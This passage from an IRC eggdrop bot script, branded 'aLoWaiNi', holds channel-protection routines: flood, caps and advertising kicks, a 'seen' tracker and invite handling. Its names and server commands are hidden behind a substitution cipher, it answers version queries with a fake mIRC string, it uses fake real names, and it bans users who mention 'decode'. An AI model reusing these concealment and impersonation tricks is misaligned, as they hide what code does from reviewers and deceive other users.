switch -- [lindex $data 3] {
part { 
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == "{}"} {set reason "."} {set reason " stating \"$reason\"."}
set output [concat $n ($addy) parting $chan [bs_when $time] ago$reason] 
}
quit { 
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == "Quit: {{}}"} {set reason "."} {set reason " stating $reason."}
set output [concat $n ($addy) quitting [string trimleft $chan "#"] [bs_when $time] ago stating$reason] 
}
kick {
set output [concat $n ($addy) kicked from [string trimleft $chan "#"] by [lindex $data 5] [bs_when $time] ago with the reason ([join [lrange $data 6 e]]).] 
}
rnck {
set output [concat $n ($addy) changing nicks from [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.] 
if {[validchan [lindex $data 4]]} {
if {[onchan $n [lindex $data 4]]} {
set [lines "lfgkfg"] [concat $output $n is still there.]
} {
set [lines "lfgkfg"] [concat $output  unseeing $n now.]
}
}
}
nick { 
set output [concat $n ($addy) changing nicks to [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.]
}
splt { 
set output [concat $n ($addy) parting [string trimleft $chan "#"] due to a split [bs_when $time] ago.] 
}
rejn { 
set output [concat $n ($addy) rejoining [string trimleft $chan "#"] from a split [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set [lines "lfgkfg"] [concat $output  $n is still on [string trimleft $chan "#"].]
} {
set [lines "lfgkfg"] [concat $output  I don't see $n on [string trimleft $chan "#"] now, though.]
}
}
}
join { 
set output [concat $n ($addy) joining [string trimleft $chan "#"] [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set [lines "lfgkfg"] [concat $output  $n is still on [string trimleft $chan "#"].]
} {
set [lines "lfgkfg"] [concat $output  unseeing $n on [string trimleft $chan "#"] now.]
}
}
}
away {
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == ""} {
set output [concat $n ($addy) returning to the partyline on [string trimleft $chan "#"] [bs_when $time] ago.]
} {
set output [concat $n ($addy) seen being marked as away ($reason) on [string trimleft $chan "#"] [bs_when $time] ago.]
}
}
chon { 
set output [concat $n ($addy) joining the partyline [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output $n is on the partyline right now.] 
set [lines "nzipvi"] 1
break
}
}
if {$marker == 0} {
set [lines "lfgkfg"] [concat $output  I don't see $n on the partyline now, though.]
}
}
chof { 
set output [concat $n ($addy) leaving the partyline [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output $n is on the partyline in [lindex $item 1] still.] 
break
}
}
}
chjn { 
set output [concat $n ($addy) joining the partyline on [string trimleft $chan "#"] [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output  $n is on the partyline right now.] 
set [lines "nzipvi"] 1
break
}
}
if {$marker == 0} {
set [lines "lfgkfg"] [concat $output  I don't see $n on the partyline now, though.]
}
}
chpt { 
set output [concat $n ($addy) leaving the partyline from [string trimleft $chan "#"] [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output  $n is on the partyline in [lindex $item 1] still.] 
break
}
}
}
default {set output "error"}
}
return $output
} {return 0}
}
proc [lines "yh_dsvm"] {lasttime} {
set [lines "bvzih"] 0 
set [lines "wzbh"] 0 
set [lines "slfih"] 0 
set [lines "nrmh"] 0 
set [lines "grnv"] [expr [unixtime] - $lasttime]
if {$time < 60} {return "only $time seconds"}
if {$time >= 31536000} {
set years [expr int([expr $time/31536000])]
set [lines "grnv"] [expr $time - [expr 31536000*$years]]
}
if {$time >= 86400} {
set days [expr int([expr $time/86400])]
set [lines "grnv"] [expr $time - [expr 86400*$days]]
}
if {$time >= 3600} {
set hours [expr int([expr $time/3600])]
set [lines "grnv"] [expr $time - [expr 3600*$hours]]
}
if {$time >= 60} {
set mins [expr int([expr $time/60])]
}
if {$years == 0} {
set [lines "lfgkfg"] ""
} elseif {$years == 1} {
set [lines "lfgkfg"] "1 year,"
} {
set [lines "lfgkfg"] "$years years,"
}
if {$days == 1} {lappend output "1 day,"} elseif {$days > 1} {lappend output "$days days,"}
if {$hours == 1} {lappend output "1 hour,"} elseif {$hours > 1} {lappend output "$hours hours,"}
if {$mins == 1} {lappend output "1 minute"} elseif {$mins > 1} {lappend output "$mins minutes"}
return [string trimright [join $output] ", "]
}
proc [lines "yh_zww"] {nick data} {
global bs_list bs
if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc [lines "yh_ohligxnw"] {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc [lines "yh_girn"] {min h d m y} {
global bs bs_list
if {![info exists bs_list] || ![array exists bs_list]} {return} 
set [lines "orhg"] [array names bs_list] 
set range [expr [llength $list] - $bs(limit) - 1] 
if {$range < 0} {return}
set [lines "orhg"] [lsort -increasing -command bs_lsortcmd $list] 
foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc [lines "yh_hvvmnzhp"] {ch nick args} {
global bs_list bs notc
set [lines "nzgxsvh"] "" 
set [lines "gvnk"] "" 
set [lines "r"] 0 
set [lines "zith"] [join $args] 
set [lines "xszm"] [lindex $args 1]
if {$chan != "" && [string trimleft $chan #] != $chan} {
if {![validchan $chan]} {return "I'm not on $chan."} {set chan [string tolower $chan]}
} { 
set [lines "xszm"] "" 
}
if {![info exists bs_list]} {return "No matches were found."} 
set [lines "wzgz"] [bs_filt [string tolower [lindex $args 0]]]
set [lines "nzhpurc"] 1
while $maskfix {
set [lines "nzip"] 1
if [regsub -all -- \\?\\? $data ? data] {set mark 0}
if [regsub -all -- \\*\\* $data * data] {set mark 0}
if [regsub -all -- \\*\\? $data * data] {set mark 0}
if [regsub -all -- \\?\\* $data * data] {set mark 0}
if $mark {break}
}
set [lines "rw"] [array startsearch bs_list]
while {[array anymore bs_list $id]} {
set [lines "rgvn"] [array nextelement bs_list $id] 
if {$item == ""} {continue} 
set [lines "r"] 0
set [lines "gvnk"] ""
set match [lindex $bs_list($item) 0] 
set addy [lindex $bs_list($item) 1]
if {[string match $data $item![string tolower $addy]]} {
set [lines "nzgxs"] [bs_filt $match] 
if {$chan != ""} {
if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
} {set matches [concat $matches $match]}
}
}
array donesearch bs_list $id
set [lines "nzgxsvh"] [string trim $matches " "]
if {$nick == "?"} {return [bs_filt $matches]}
set [lines "ovm"] [llength $matches]
if {$len == 0} {return "No matches were found."}
if {$len == 1} {return [bs_output $ch $nick $matches 1]}
if {$len > 99} {return "I found $len matches to your query; please refine it to see any output."}
set [lines "nzgxsvh"] [bs_sort $matches]
if {$len <= 5} {
set output [concat I found $len matches to your query (sorted): [join $matches].]
} {
set output "I found $len matches to your query.  Here are the 5 most recent (sorted): [join [lrange $matches 0 4]]."
}
return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
} 
proc [lines "yh_hlig"] {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc [lines "yh_qlrm_ylgrwov"] {nick uhost hand chan} {
global bs_botidle botnick notc
if {$nick == $botnick} {
set bs_botidle([string tolower $chan]) [unixtime]
}
}
proc [lines "kfyorx_krmt"] {nick uhost hand chan rest} {
global pingchan
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {![info exists pingchan($nick)]} {
set pingchan($nick) $chan 
}
puthlp "KIRENHT ~$nick ~:\001KRMT ~[unixtime]~\001"
return 0
}
bind pubm - * repeat_pubm
bind pubm - * repeat_pubmm
bind ctcp - ACTION action_chk
proc [lines "zxgrlm_xsp"] {nick host hand chan keyword arg} {
global botnick
if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
if {[matchattr $nick Z]} {
set [lines "zit"] "`$arg"
}
if {![validchan $chan]} {
msg_prot $nick $host $hand $arg
} {
repeat_pubm $nick $host $hand $chan $arg
repeat_pubmm $nick $host $hand $chan $arg
pum_arg $nick $host $hand $chan $arg
}
}
proc [lines "ivkvzg_kfyn"] {nick uhost hand chan text} {
global repeat_last botnick notb notc kops ps owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick notm
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
pub_Z $nick $uhost $hand $chan $text
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "ivzo"] $text
set [lines "gvcg"] [uncolor $text]
if {$nick == "ChanServ"} {
if {[string match "*has deopped $botnick*" $text]} {
if {![matchattr [lindex $text 0] f]} { 
if {[matchattr $cflag D]} {
set [lines "wvlknv"] [lindex $text 0]
}
}
}
return 0
}
if {[matchattr $nick f]} { return 0 }
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {$nick == $botnick} { return 0 }
set [lines "ivhfnv"] "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "ivhfnv"] "F" 
}
if {![isop $botnick $chan]} { 
set [lines "ivhfnv"] "F" 
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set [lines "ivhfnv"] "F" 
}
if {[isvoice $nick $chan]} { 
set [lines "ivhfnv"] "F" 
}
}
if {[string tolower [lindex $text 0]] == "slaps"} {
if {$resume == "F"} { return 0 }
if {[lindex $text 1] == $botnick} {
putsrv "KIRENHT ~$chan ~:\001ZXGRLM hozkh ~$nick ~zilfmw z yrg drgs z ozitv gilfg"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14HvOU 4HOzKH 14KIlGVXGRLM!!"
return 0
}
if {[matchattr [lindex $text 1] n]} {

putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlMG 4HOzKH14 nb ZWnRM!!"
return 0
}
if {[matchattr [lindex $text 1] f]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlMG 4HOzKH14 nb UirvMw!!"
return 0
}
if {[matchattr [lindex $text 1] m]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlMG 4HOzKH14 nb NzHGVI!!"
}
return 0
}
# Tsunami Flood PRoTECTION
if {[string length $text] > 100} {
set [lines "xsi"] 0
set [lines "xmg"] 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
if {$resume == "T"} {
set bannick($nick) "*!*$mhost"
if {![isutimer "TsunamI $chan"]} {
utimer 30 [list putlog "TsunamI $chan"]
} elseif {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*$mhost"]
}
if {$quick == "1" && ![info exists is_m($chan)]} {
putqck "PRXP ~$chan ~~$nick ~:~$notm ~14ZYfhRMt 4GhfmznR ~[banms]~"
} {
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~14ZYfHRMT 4GhfmznR ~[banms]~"
}
}
return 0
}
}
if {![info exists kops]} {
if {$resume == "F"} { return 0 }
}
if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14tL OllP rm z 4nRIIlI14..!"
return 0
}
if {[string match "*decode*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4WvxLwV14 WvMRzO ~[banmsg]~"
return 0
}
if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return }
}
foreach seekchan $text {
if {[string match "*#*" $seekchan]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlmG 4RmeRGVw14 NzGxS UIlN 4~$seekchan ~~[banms]~"
return 0
}
}
}
if {[string match "*http://*" [string tolower $text]] || [string match "*www.*.*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlmG 4ZweVIGRhV14 RM 4~[string toupper $chan]~ ~[banms]~"
return 0
}
if {[matchattr $cflag R]} {
if {[info exists repeat_last($mhost$chan)]} {
if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
if {![info exists repeat_person($mhost$chan)]} {
set repeat_person($mhost$chan) 1
} {
incr repeat_person($mhost$chan)
}
if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4IvKvzG 14UIlN 4~$mhost ~14NzC4 ~[getuser $cflag XTRA "RPT"]~ ~[banms]~"
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
return 0
}
}
}
set repeat_last($mhost$chan) $text
}
if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "OL $chan"] 
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14ZYfHRMt 4OlMt GvcG 14NzC4 ~[getuser $cflag XTRA "CHAR"]~14 XSzI ~[banmsg]~"
} {
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~14ZYfHRMt 4OlMt GvcG 14NzC4 ~[getuser $cflag XTRA "CHAR"]~14 XSzI ~[banmsg]~"
}
return 0
}
if {[matchattr $cflag U]} {
set [lines "ovm"] [string length $text]
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {$len < 30} { return 0 }
set [lines "xmg"] 0
set [lines "xzkxmg"] 0
while {$cnt < $len} {
if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
incr capcnt
}
incr cnt
}
if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
if {![info exists capsnick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14HGlK FhVw 4XzkhOlxP14 VcxvVw4 ~[getuser $cflag XTRA "CAPS"]~%14..!"
set capsnick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw14 DzIM WlmG FhVw 4XzkhOlxP14 VcxvVw4 ~[getuser $cflag XTRA "CAPS"]~% ~[banms]~"
unset capsnick($nick)
}
}
}
proc [lines "kfn_zit"] {nick uhost hand chan text} {
global boldnick colorkick botnick notc kops ps
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[matchattr $nick f]} { return 0 }
if {[matchattr $nick m]} { return 0 }
if {[matchattr $nick z]} { return 0 }
if {$nick == $botnick} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set [lines "ivhfnv"] "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "ivhfnv"] "F"
}
if {![isop $botnick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {[isvoice $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
}
if {$resume == "F"} { return 0 }
if {[matchattr $cflag B]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match *\002* $text]} {
if {![info exists boldnick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14HGlK FhVw 4yLOw14 GvCg LmOB4..!"
set boldnick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
#set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw14 DzIM WlmG FhVw 4yLOw14 ~[banms]~"
unset boldnick($nick)
}
}
if {[matchattr $cflag W]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match ** $text]} {
if {![info exists colorkick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WLmG FhVw 4XlOLfI14 GvCg LmOB4..!"
set colorkick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
#set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw14 DzIM WlmG FhVw 4XlOLfI ~[banms]~"
unset colorkick($nick)
}
}
}
set realnm {
   "aLoWaiNi Crew" "aLoWaiNi Team" "aLoWaiNi Guard" "Monster Fighter"
   "aLoWaiNi Connection" "aLoWaiNi Inside" "IT Support"
   "For Belajar Only" "Not For Commercial" "Free Monster Help"
   "Friend Forever" "Long Way TO GO" "Knowledge is Free"
   "Happy Days" "Best Days" "FIVA FOREVER"
}
proc realnames {} {
   global realnm
   set realnames [lindex $realnm [rand [llength $realnm]]]
}
proc [lines "ivkvzg_kfynn"] {nick uhost hand chan text} {
global repeat_last botnick notb notc kops ps owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick notm yealnick 
global repeat_last repeat_num botnick repeat_person floodnick invnick
global capsnick lsttxt lamnick notm
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
#pub_Z $nick $uhost $hand $chan $text
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[matchattr $nick f]} { return 0 }
if {[matchattr $nick m]} { return 0 }
if {[matchattr $nick z]} { return 0 }
if {$nick == $botnick} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set [lines "ivhfnv"] "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "ivhfnv"] "F"
}
if {![isop $botnick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
if {[isvoice $nick $chan]} { 
set [lines "ivhfnv"] "F"
}
}
if {$resume == "F"} { return 0 }
if {[isop $nick $chan]} { set resume "F" }
if {[isvoice $nick $chan]} { set resume "F" }
set [lines "gvcg"] [uncolor $text]
# Tsunami Flood PRoTECTION
if {[string length $text] > 100} {
set chr 0
set cnt 0
while {$cnt < [string length $text]} {
if [isflood [string index $text $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
set [lines "slhgnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
putlog "!log! IgNORE <<$hostmask>> !TSunAMI!"
newignore $hostmask $botnick "AUTO IGNORE" 1
if {$resume == "T"} {
set [lines "slhgnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
putserv "KICK $chan $nick :$notm  14abusing 4TSuNAMI14 flood [banmsg]"
if {$hostmask != "*!*@*"} { putserv "mode $chan +bm $hostmask" }
set lamnick($nick) "$notm 14abusing 4TSuNAMI14 flood [banmsg]"
}
return 0
}
}
if {$resume == "F"} { return 0 }
if {[matchattr $cflag T] && [string length $text] > [getuser $cflag XTRA "CHAR"]} {
if {[info exists lsttxt([string range $text 1 50])]} {
set [lines "slhgnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
putserv "KICK $chan $nick :$notm 4TwICE14 PaSTE 4LaRGE14 amounts of same TeXT is flood!! [banmsg]"
if {$hostmask != "*!*@*"} { putserv "mode $chan +bm $hostmask" }
set lamnick($nick) "$notm 4TwICE14 PaSTE 4LaRGE14 amounts of same TeXT is flood!! [banmsg]"
unset lsttxt([string range $text 1 50])
return 0
} else { set lsttxt([string range $text 1 50]) "1" }
}
if {[matchattr $cflag T] && [string length $text] > 250} {
if {![info exists floodnick($nick)]} {
set floodnick($nick) "1"
putserv "KICK $chan $nick :$notm 14TeXT 4OvERLoAD14 MaX 250 LeNGTH!!"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
putserv "KICK $chan $nick :$notm 14ToLD YoU DoNT 4OvER14 THaN 250 LeNGTH [banmsg]"
if {$banmask != "*!*@*"} { putserv "mode $chan +b $banmask" }
unset floodnick($nick)
return 0
}
}
proc [lines "rhfkkvi"] {letter} {
set [lines "xzkh"] {A B C D E F G H I
J K L M N O P Q R
S T U V W X Y Z}
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc [lines "rhuollw"] {letter} {
set caps {! @ # $ % ^ & * (
) | [ ] < > / \ =    }
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc [lines "rhyzw"] {nick uhost chan arg} {
global badwords botnick notc bannick
set [lines "zit"] [string tolower $arg]
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "rhyzw"] 0 
return 0
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $arg]]} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzWDlIW14 NzGxS UIlN 4~[string toupper $badword]~ ~[banms]~"
return 1
}
}
set [lines "rhyzw"] 0
return 0
}
proc [lines "hvg_-p"] {chan} {
set [lines "xnlwv"] [getchanmode $chan]
if {[string match "*aLoWaiNi*" $cmode]} {
set [lines "fmpvb"] [string range $cmode [string first "aLoWaiNi" $cmode] end]
putsrv "nlwv ~$chan ~-p ~$unkey"
}
}
proc [lines "hvg_-I"] {chan} {
putsrv "nlwv ~$chan ~-I"
}
proc [lines "hvg_-n"] {chan} {
if {[isutimer "set_-m $chan"]} { return 0 }
if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
putserv "mode $chan -m"
}
}
proc [lines "glkrx_xsp"] {nick host handle chan topic} {
global botnick notc bannick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $cflag I]} { return 0 }
if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
if {[matchattr $nick m]} {
setuser $cflag XTRA "TOPIC" [topic $chan]
saveuser
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
if {![string match "*dal.net*" $nick]} {
set [lines "yzmnzhp"] "*!*[string range $host [string first "@" $host] end]"
set bannick($nick) $banmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14WlmG xSzMtRMt 4GlKRx ~[banms]~"
}
puthlp "glkrx ~$chan ~:~[getuser $cflag XTRA "TOPIC"]~"
return 0
}
bind flud - * flood_chk
proc [lines "uollw_xsp"] {nick host handle type channel} {
global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops
putlog "!Log! FLOOD <<$type>> FRoM $host"
if {[info exists bannick($nick)]} { return 1 }
if {[info exists igflood($nick)]} { return 1 }
if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} {
putlog "!Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
if {[string index $channel 0] != "#"} {
foreach x [channels] {
if {[onchan $nick $x]} {
set [lines "xszmmvo"] $x
}
}
}
set [lines "nslhg"] "@[lindex [split $host @] 1]"
if {[string index $channel 0] == "#"} { 
if {![isop $botnick $channel]} {
putlog "!Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
set [lines "gbkv"] [string tolower $type]
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notm ~14VcxvVw NzC 4QlRM14 UIlN 4~$mhost ~~[banms]~"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!*$mhost"
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$nick ~:~$notm ~14VcxvVw NzC 4xGxK14 UIlN 4~$mhost ~~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$nick ~:~$notm ~14VcxvVw NzC 4xGxK14 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "pub"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!$host"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14VcxvVw NzC 4ORMVH14 UIlN 4~$mhost ~~[banms]~"
return 1
}
if {$type == "nick"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
return 1
}
}
if {![info exists floodnick($mhost)]} {
set floodnick($mhost) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14hGLk xSzMtRMt BlfI 4MRxP14..!"
} {
catch {unset floodnick($mhost)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14GdRxV VcxvVw 4MRxP14 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "deop"} {
if {![info exists flooddeop($nick)]} {
set flooddeop($nick) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14VcxvVw NzC 4Wv@k14 UIlN 4~$mhost14..!"
} {
catch {unset flooddeop($nick)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14GdRxV VcxvVw NzC 4Wv@k14 UIlN 4~$mhost ~~[banms]~"
}
}
if {$type == "kick"} {
if {![info exists floodkick($nick)]} {
set floodkick($nick) 1
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14VcxvVw NzC 4PRxP14 UIlN 4~$mhost14..!"
} {
catch {unset floodkick($nick)}
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14GdRxV VcxvVw NzC 4PRxP14 UIlN 4~$mhost14..!"
}
}
return 1
}
bind raw - INVITE raw_chk
proc [lines "izd_xsp"] {nick keyword arg} {
global invme joinme notc bannick notd botnick
set [lines "dsl"] [string range $nick 0 [expr [string first "!" $nick]-1]]
set [lines "xszmmvo"] [lindex $arg 1]
set [lines "xszmmvo"] [string range $channel 1 end]
foreach x [channels] {
if {[string tolower $channel] == [string tolower $x]} {
putsrv "QLRM ~$channel"
return 0
}
}
if {$who == "ChanServ" || [matchattr $who Z]} {
if {![validchan $channel]} {
if {[matchattr $who Z] && ![matchattr $who Q]} {
puthlp "MLGRXV ~$who ~:~$notc ~4WvMRVw..!"
return 0
} else { 
set [lines "qlrmnv"] $who
}
channel add $channel
catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
}
putsrv "QLRM ~$channel"
return 0
}
if {[matchattr $who f]} { return 0 }
foreach x [channels] {
if {[onchan $who $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $nick [string first "@" $nick] end]"
set bannick($who) $banmask
putsrv "PRXP ~$x ~~$who ~:~$notc ~4!HkzN!14 R SzGV 4RmeRGvI ~[banms]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
set [lines "hvmwhkzn"] "!kick [zip "$x $who $notc 4!SpaM!14 FRoM 4[string range $nick [string first "@" $nick] end]14 InvITE [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
bind ctcp - "VERSION" ctcp_version
bind ctcp - "TIME" ctcp_time
proc [lines "xgxk_evihrlm"] {nick uhost handle dest keyword args} {
global botnick 
putsrv "MLGRXV ~$nick ~:\001EVIHRLM nRIX e6.17 Pszovw Nziwzn-Yvb\001"
return 1
}
proc [lines "xgxk_grnv"] {nick uhost handle dest keyword args} {
global botnick 
set [lines "xfigrnv"] [ctime [unixtime]]
putsrv "MLGRXV ~$nick ~:\001GRNV ~$curtime\001"
return 1
}
proc [lines "ho_xgxk"] {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick f] || $nick == $botnick} { return 1 }
if {[string match "*dal*et*" [string tolower $uhost]]} {
putsrv "MLGRXV ~$nick ~:\001EVIHRLM nRIX32 e6.17 Pszovw Nziwzn-Yvb\001"
} {
set [lines "slhgnzhp"] "${nick}!*@*"
